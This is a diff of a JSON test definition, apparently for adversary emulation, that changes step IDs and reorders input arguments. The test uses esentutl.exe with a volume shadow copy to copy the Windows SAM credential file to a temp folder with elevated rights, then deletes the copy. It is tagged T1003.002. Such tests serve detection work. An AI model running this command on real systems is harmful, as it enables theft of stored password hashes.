@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "ba069c09-0bd8-42e8-a89e-c7ef1834c19d",
+      "id": "c21919a5-e19d-5f30-a131-7b5f124b854d",
       "type": "execute-command",
       "data": {
         "command": "esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}",
@@ -16,7 +16,7 @@
       "elevation_required": true
     },
     {
-      "id": "52b267e5-6f1a-4cc8-8535-2409a0976daf",
+      "id": "62d5c43a-8647-5eff-8ecc-b2259a9a437c",
       "type": "execute-command",
       "data": {
         "command": "del #{copy_dest}\\#{file_name} \u003enul 2\u003e\u00261",
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "ba069c09-0bd8-42e8-a89e-c7ef1834c19d",
+      "s": "c21919a5-e19d-5f30-a131-7b5f124b854d",
       "p": "on-success",
-      "o": "52b267e5-6f1a-4cc8-8535-2409a0976daf"
+      "o": "62d5c43a-8647-5eff-8ecc-b2259a9a437c"
     },
     {
-      "s": "ba069c09-0bd8-42e8-a89e-c7ef1834c19d",
+      "s": "c21919a5-e19d-5f30-a131-7b5f124b854d",
       "p": "on-failure",
-      "o": "52b267e5-6f1a-4cc8-8535-2409a0976daf"
+      "o": "62d5c43a-8647-5eff-8ecc-b2259a9a437c"
     }
   ],
   "tags": [
@@ -42,12 +42,6 @@
     "T1003.002"
   ],
   "input_arguments": [
-    {
-      "name": "file_path",
-      "type": "path",
-      "description": "Path to the file to copy",
-      "value": "%SystemRoot%/system32/config/SAM"
-    },
     {
       "name": "file_name",
       "type": "string",
@@ -59,6 +53,12 @@
       "type": "string",
       "description": "Destination of the copied file",
       "value": "%temp%"
+    },
+    {
+      "name": "file_path",
+      "type": "path",
+      "description": "Path to the file to copy",
+      "value": "%SystemRoot%/system32/config/SAM"
     }
   ]
 }
